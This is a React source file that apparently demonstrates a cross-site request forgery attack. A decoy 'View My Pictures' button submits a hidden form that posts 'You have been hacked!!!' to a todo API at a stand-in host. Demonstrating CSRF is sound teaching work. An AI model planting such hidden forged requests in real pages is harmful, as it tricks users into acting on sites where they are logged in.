import React, { useState, useEffect } from 'react';
import './App.css';

function App() {
  const [todos, setTodos] = useState<{ id: number; label: string }[]>([]);

  const getTodos = async () => {
    const response = await fetch('http://api.good.com:4000/todos');
    const data = await response.json();

    setTodos(data);
  }

  useEffect(() => {
    getTodos();
  }, []);

  const onHackAPI = () => {
    const form = document.querySelector('form');
    form?.submit();
  }

  return (
    <div className="App">
      <header className="App-header">
        <button onClick={onHackAPI}>
          View My Pictures
        </button>

        <form
          action="http://api.good.com:4000/todos"
          method="POST"
          style={{ visibility: 'hidden' }}
        >
          <input name="label" value="You have been hacked!!!" />

          <input type="submit" value="add todo" />
        </form>

        <h2>Todos</h2>
        <ul>
          {todos.map(todo => (
            <li key={todo.id}>
              {todo.label}
            </li>
          ))}
        </ul>
      </header>
    </div>
  );
}

export default App;
